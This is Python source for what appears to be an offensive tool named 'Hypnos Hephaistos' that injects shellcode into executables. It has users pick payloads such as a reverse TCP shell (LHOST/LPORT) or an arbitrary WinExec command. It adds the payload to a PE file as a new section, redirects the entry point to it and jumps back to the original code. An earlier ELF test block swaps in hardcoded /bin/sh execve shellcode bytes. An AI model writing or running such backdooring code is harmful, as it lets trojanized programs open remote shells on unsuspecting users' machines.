import os
import sys
import platform
sys.path.insert(0, sys.path[0].replace("\\SRC\\Core\\Modules", ""))

from SRC.Libs import LibDebug
from SRC.Libs import LibObfuscator
from SRC.Libs import LibByteEditor
from SRC.Libs import LibPeAnnalyzer
from SRC.Libs import LibElfAnnalyzer
from SRC.Libs import LibShellcode
from SRC.Libs import LibPeEditor
from SRC.Libs import LibElfEditor
from SRC.Libs import LibObjCopy

Env = LibDebug.CheckEnv()
LibDebug.CheckHypnosReq()

def menu():
    inputfile = "test.out"
    outputfile = "ELFx64_EDITED_printf.out"

    LibObjCopy.test()

    HexContent = LibByteEditor.GetHexFromFile(inputfile)
    ElfInput = LibElfAnnalyzer.Extract(HexContent)

    open("HEXCONTENT.x", "w").write(HexContent)
    with open("HEXCONTENT.x", mode='r') as f:
        HexContent = f.read()

    HexContent.replace("554889E5488D3DA90E0000E8D5FFFFFFB8000000005DC3660F1F84000000","4831d248bb2f2f62696e2f736848c1eb08534889e750574889e6b03b0f05")

    LibByteEditor.CreateBinFromHex(outputfile,HexContent)
    
    exit()
    # LibElfEditor.AddSection(ElfInput, ".mew", "0000")

    print(ElfInput.Elfheader.entrypoint)
    ElfInput.Elfheader.entrypoint = ElfInput.Sectionheadertable.sectiontable[27].offset
    print(ElfInput.Elfheader.entrypoint)

    ElfInput.Sectionheadertable.sectiontable[27].flags = "0000000000000006"
    print(ElfInput.Sectionheadertable.sectiontable[27].flags)
    print(ElfInput.Sectionheadertable.sectiontable[14].flags)

    LibByteEditor.CreateBinFromClass(outputfile,ElfInput)
    
    HexContent2 = LibByteEditor.GetHexFromFile(outputfile)

    if HexContent != HexContent2:
        print("shit")

    exit()

    outputfile = LibObfuscator.RandomizedString(7) + ".exe"
    print(
        "Welcome to Hypnos Hephaistos Version"
    )
    print(
        "Do you want to specify an executable to edit or did you want me to generate one ? [edit/generate] or [e/g] : ", end=""
    )
    value = input()
    case = ["generate", "edit", "e", "g"]
    if value in case:
        if value == "generate" or value == "g":
            LibDebug.Log("WORK", "Generating executable..")
            try:
                ObfuscatedC = LibObfuscator.ObfuscateC(
                    LibObfuscator.GenerateC(50), 25)
                inputfile = LibObfuscator.Compile(ObfuscatedC)
                os.system("rm *.c")
                LibDebug.Log("SUCCESS", inputfile + " generated..")
            except:
                LibDebug.Log("ERROR", "Generation failed..")
        elif value == "edit" or value == "e":
            LibDebug.Log("WORK", "Generating executable..")
            print("There is the sample list :")
            for (dirpath, _, filenames) in os.walk("EXECUTABLE"):
                for file in filenames:
                    print(dirpath +"/"+ file)
            value = input("Enter the file you want to exploit : ")
            LibDebug.CheckFile(value)
            inputfile = value
    else:
        LibDebug.Log("ERROR", "Bad entry. Exiting.")
        exit()
    HexContent = LibByteEditor.GetHexFromFile(inputfile)
    PeInput = LibPeAnnalyzer.Extract(HexContent)
    if PeInput.Optionalpeheader.signature == "020b":
            print("!! Your file is a X64 beware to pick a X64 shellcode !!")
    elif PeInput.Optionalpeheader.signature == "010b":
            print("!! Your file is a X32 beware to pick a X32 shellcode !!")
    print("It's time to generate a shellcode .\nHere's a list of options :")
    shellcodes = []
    for (dirpath, _, filenames) in os.walk("SHELLCODES"):
        for file in filenames:
            shellcodes.append((dirpath+"/"+file).replace("\\","/").replace("ASM/ShellCodes/", "").split(".")[0])
    case = []
    for i in range(0, len(shellcodes)):
        case += str(i)
        print("     " + str(i) + " - " + shellcodes[i].replace("SHELLCODES/",""))
    value = input("Select one shellcode : ")
    shellcode = LibShellcode.SHELLCODE()
    shellcode = LibShellcode.ReadSHELLCODE(shellcodes[int(value)])
    if value in case:
        LibDebug.Log("SUCCESS", shellcodes[int(value)] + " successfuly loaded.")
        LibDebug.Log("WORK", "Generating the shellcode..")
        selection = shellcodes[int(value)].replace("SHELLCODES/","")
        try:
            if "x32_Custom_Dynamic_WinExec" in selection:
                print("Please enter your COMMAND   : ", end="")
                CMD = input()
                shellcode = LibShellcode.EditWinexec(shellcode, CMD)
            elif "x32_Custom_Dynamic_ReverseTCP_Shell" in selection:
                print("Please enter your  LHOST IP   : ", end="")
                LHOST = input()
                print("Please enter your  LPORT   : ", end="")
                LPORT = input()
                shellcode = LibShellcode.EditCDRTSX32(shellcode, LHOST, LPORT)
        except:
            LibDebug.Log(
                "ERROR", "Something went wrong with the generation. Exiting.")
            exit()
    else:
        LibDebug.Log("ERROR", "Bad entry. Exiting.")
        exit()

    #  ANCIENNE GENERATION AVEC NASM
    #   shellcodes = []
    #   for (dirpath, _, filenames) in os.walk("ASM/ShellCodes"):
    #       for file in filenames:
    #           if "dev" not in dirpath.split("\\") :
    #               shellcodes.append((dirpath+"/"+file).replace("\\","/").replace("ASM/ShellCodes/", "").split(".")[0])
    #   case = []
    #   for i in range(0, len(shellcodes)):
    #       if shellcodes[i].split("/")[1] == Env.ARCH:
    #           case += str(i)
    #           print("     " + Color.GREEN + str(i) +
    #               Color.RESET + " - " + shellcodes[i])
    #   value = input("Select one shellcode : ")
    #   shellcode = LibShellcode.SHELLCODE()
    #   if value in case:
    #       LibDebug.Log("SUCCESS", shellcodes[int(
    #           value)] + " successfuly loaded.")
    #       LibDebug.Log("WORK", "Generating the shellcode..")
    #       selection = shellcodes[int(value)].replace("Windows/" + Env.ARCH + "/","")
    #       try:
    #           if selection == "Custom_Dynamic_ReverseTCP_Shell":
    #               print("Please enter your " + Color.YELLOW +
    #                             " LHOST IP   : ", end="")
    #               LHOST = input()
    #               print("Please enter your " + Color.YELLOW +
    #                             " LPORT   : ", end="")
    #               LPORT = input()
    #               shellcode = LibShellcode.GenerateCDRTShell(LHOST, LPORT)
    #           elif selection == "Custom_Dynamic_ReverseTCP_Staged":
    #               shellcode = LibShellcode.GenerateCDRTS()
    #           elif selection == "Custom_Dynamic_ReverseTCP_Threaded_Shell":
    #               shellcode = LibShellcode.GenerateCDRTTShell()
    #           elif selection == "Custom_Dynamic_WinExec":
    #               print("Please enter your " + Color.YELLOW +
    #                           " COMMAND   : ", end="")
    #               CMD = input()
    #               shellcode = LibShellcode.GenerateWinExec(CMD)
    #       except:
    #           LibDebug.Log(
    #               "ERROR", "Something went wrong with the generation. Exiting.")
    #           exit()
    #   else:
    #       LibDebug.Log("ERROR", "Bad entry. Exiting.")
    #      exit()

    newjump = str(hex(int(LibByteEditor.RevertBytes(PeInput.Optionalpeheader.addressofentrypoint), 16)
                      + int(LibByteEditor.RevertBytes(PeInput.Optionalpeheader.imagebase), 16)))[2:]
    shellcode = shellcode.GetShellcode()
    shellcode += "B8" + newjump + "FFE0"
    LibDebug.Log("SUCCESS", "Shellcode successfully generated.")
    LibDebug.Log("WORK", "Generating new section..")
    LibPeEditor.AddSection(PeInput, ".mew", shellcode)
    LibDebug.Log("WORK", "Calculating new EntryPoint..")

    LibPeEditor.ModifyEntryPoint(PeInput, PeInput.SectionTable.sections[int(PeInput.Coffheader.numberofsections, 16)-1].virtualaddress)

    LibDebug.Log("WORK", "Generating edited executable..")
    LibByteEditor.CreateBinFromClass(outputfile, PeInput)
    print("Did you want to verify the new executable ? [y/n] : ", end="")
    value = input()
    case = ["y", "n"]
    if value in case:
        try:
            if value == "y":
                HexContent = LibByteEditor.GetHexFromFile(inputfile)
                PeInput = LibPeAnnalyzer.Extract(HexContent)
                HexContent = LibByteEditor.GetHexFromFile(outputfile)
                PeInput2 = LibPeAnnalyzer.Extract(HexContent)
                LibDebug.ComparePe(PeInput, PeInput2)
                LibDebug.Log("SUCCESS", "Your new file is " + outputfile)
            elif value == "n":
                LibDebug.Log("SUCCESS", "Your new file is " + outputfile)
        except:
            LibDebug.Log(
                "ERROR", "Something went wrong with the Verification. Exiting.")
            exit()
    else:
        LibDebug.Log("ERROR", "Bad entry. Exiting.")
        exit()

menu()